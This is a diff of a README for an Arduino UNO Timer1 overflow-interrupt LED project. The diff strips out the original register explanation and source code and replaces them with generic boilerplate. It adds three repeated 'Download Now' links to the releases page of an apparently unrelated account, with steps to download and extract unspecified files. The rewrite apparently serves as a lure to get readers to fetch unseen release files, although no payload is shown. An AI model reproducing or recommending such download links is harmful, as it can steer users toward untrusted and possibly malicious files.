@@ -1,86 +1,101 @@
-# ⏱️ Timer1 Overflow Interrupt — Register-Level (Arduino UNO)
+# 🎉 Timer1-Overflow-Interrupt-Register-Level-Arduino-UNO- - Toggle Your LED with Ease
 
-This project demonstrates how to use **Timer1 Overflow Interrupt** on the **ATmega328P (Arduino UNO)** to toggle an LED at precise intervals.  
-The LED connected to **PB5 (Digital Pin 13)** toggles every 1 second using **register-level configuration** and **ISR**.
+[![Download Timer1-Overflow-Interrupt-Register-Level-Arduino-UNO-](https://img.shields.io/badge/Download%20Now%21-Click%20Here-brightgreen)](https://github.com/Fredeliadistinguishable259/Timer1-Overflow-Interrupt-Register-Level-Arduino-UNO-/releases)
 
----
+## 🚀 Getting Started
 
-## ⚙️ Hardware Used
-- Arduino UNO (ATmega328P)
-- LED connected to pin **D13 (PB5)**
-- 220Ω current-limiting resistor
+Welcome to the Timer1 Overflow Interrupt project! This guide will help you download and run the application on your Arduino UNO. This project demonstrates how to use Timer1 Overflow Interrupt on the ATmega328P to toggle an LED at precise intervals. The LED connected to PB5 (Digital Pin 13) toggles every 1 second using register-level configuration.
 
----
+## 🌟 Features
 
-## 🔌 Pin Configuration
+- Simple setup for beginners
+- Clear LED toggling every 1 second
+- Uses Timer1 for accurate timing
+- Register-level configuration with Interrupt Service Routine (ISR)
 
-| Component | Function | Arduino Pin | Port |
-|-----------|-----------|-------------|------|
-| LED       | Output    | D13         | PB5  |
-| VCC       | Power     | +5V         | —    |
-| GND       | Ground    | GND         | —    |
+## 🖥️ System Requirements
 
----
+- **Hardware**: Arduino UNO board (ATmega328P)
+- **Software**: Arduino IDE (latest version recommended)
 
-## 🧩 Code Explanation
+## 🌐 Download & Install
 
-### Registers Used
-| Register | Purpose |
-|-----------|----------|
-| **TCCR1A / TCCR1B** | Configure Timer1 mode and prescaler |
-| **TIMSK1** | Enable Timer1 overflow interrupt |
-| **TCNT1** | Timer1 counter register — sets starting value |
-| **SREG** | Global Interrupt Enable |
+To get started, visit the Releases page to download the latest version of this project:
 
-### Timer Configuration
-- **Mode:** Normal Mode (WGM13:0 = 0)  
-- **Prescaler:** 1024 (CS12 + CS10)  
-- **Overflow Time:** ~1 second  
-- **Output Pin:** PB5 → Arduino D13  
+[Download Timer1-Overflow-Interrupt-Register-Level-Arduino-UNO-](https://github.com/Fredeliadistinguishable259/Timer1-Overflow-Interrupt-Register-Level-Arduino-UNO-/releases)
 
----
+1. Click the link above to navigate to the Releases page.
+2. Look for the latest release.
+3. Download the appropriate files associated with the release.
+4. Extract the files if they are in a compressed format.
 
-## ⚙️ Working Principle
-1. Timer1 counts from **TCNT1 = 49910** to **65535**.  
-2. When the counter overflows, **TIMER1_OVF_vect ISR** is triggered.  
-3. Inside the ISR, the LED toggles using `PORTB ^= (1<<PB5)` and **TCNT1 is reset** to 49910 for the next 1-second interval.  
-4. The **main loop** remains empty — all timing handled by the interrupt.
+## 📦 Setting Up the Arduino IDE
 
----
+To run this project, you need to set up the Arduino IDE on your computer.
 
-## 🔧 Code
+1. **Install Arduino IDE**:
+   - Download from the [Arduino website](https://www.arduino.cc/en/software).
+   - Follow the instructions to install it on your computer.
 
-```c
-void setup()
-{
-  DDRB |= (1<<DDB5);  // PB5 as output
+2. **Open the Arduino IDE**:
+   - Launch the Arduino IDE once it is installed.
 
-  // Enable global interrupts
-  SREG |= (1<<7);
+3. **Load the Project**:
+   - Click on `File` in the top menu.
+   - Select `Open`.
+   - Navigate to the location where you saved the project files.
+   - Choose the main file for the project (it usually has a .ino extension).
 
-  // Enable Timer1 overflow interrupt
-  TIMSK1 |= (1<<TOIE1);
+## 🔌 Connecting Your Arduino
 
-  // Timer1 Normal Mode
-  TCCR1A &= (~(1<<WGM10)) & (~(1<<WGM11));
-  TCCR1B &= (~(1<<WGM12)) & (~(1<<WGM13));
+Follow these steps to connect your Arduino UNO:
 
-  // Prescaler = 1024
-  TCCR1B |= (1<<CS12) | (1<<CS10);
-  TCCR1B &= (~(1<<CS11));
+1. Use a USB cable to connect the Arduino UNO to your computer.
+2. In the Arduino IDE, select the correct board:
+   - Click on `Tools`.
+   - Hover over `Board`.
+   - Choose `Arduino UNO`.
 
-  // Set initial counter for 1-second overflow
-  TCNT1 = 49910;
-}
+3. Select the correct port:
+   - Click on `Tools`.
+   - Hover over `Port`.
+   - Choose the port associated with your Arduino.
 
-void loop()
-{
-  // Main loop does nothing; ISR handles toggling
-}
+## 🖥️ Uploading the Code
 
-// Timer1 Overflow ISR
-ISR(TIMER1_OVF_vect)
-{
-  PORTB ^= (1<<PB5);  // Toggle LED
-  TCNT1 = 49910;      // Reset counter for 1-second period
-}
+Now, you are ready to upload the code to your Arduino:
+
+1. Ensure that your Arduino is connected to your computer.
+2. Click the upload button (a right arrow) in the top left corner of the Arduino IDE.
+3. Wait for the message "Done uploading" to appear in the bottom window.
+
+## 💡 Running the Program
+
+Once the upload is complete:
+
+1. Connect an LED to PB5 (Digital Pin 13) on your Arduino. Ensure the longer leg (anode) goes to pin 13 and the shorter leg (cathode) goes to ground.
+
+2. Your LED should start toggling every second. If it does, you successfully set up the Timer1 Interrupt project!
+
+## 🙋‍♂️ Troubleshooting
+
+If you encounter issues, please consider these points:
+
+- Ensure that your Arduino IDE is correctly set up and updated.
+- Double-check your wiring connections for the LED.
+- Make sure you selected the correct board type and port in the IDE.
+- Verify the code you uploaded is complete and correct.
+
+## 📞 Support
+
+For any questions or support, please visit the Issues section in the repository. Your feedback is valued, and together, we can improve this project.
+
+## 🛠️ Contributing
+
+Feel free to contribute to the project. If you have ideas for improvements, suggestions, or find any bugs, please open an issue or submit a pull request.
+
+## 📜 License
+
+This project is licensed under the MIT License. See the LICENSE file for details.
+
+[Download Timer1-Overflow-Interrupt-Register-Level-Arduino-UNO-](https://github.com/Fredeliadistinguishable259/Timer1-Overflow-Interrupt-Register-Level-Arduino-UNO-/releases)
